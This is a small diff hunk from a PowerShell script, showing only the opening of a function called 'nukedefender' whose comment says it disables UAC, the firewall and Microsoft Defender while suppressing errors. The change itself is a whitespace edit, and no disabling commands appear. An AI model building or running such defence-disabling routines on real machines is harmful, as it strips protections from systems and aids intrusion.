@@ -13,7 +13,7 @@
 
 # ---- BEGIN NUKE DEFENDER FUNCTION
 function nukedefender {
-    $ErrorActionPreference = "SilentlyContinue"
+    $ErrorActionPreference = "SilentlyContinue" 
   
     # DISABLE UAC, FIREWALL, DEFENDER
     write-host("`n  [++] Nuking Defender")
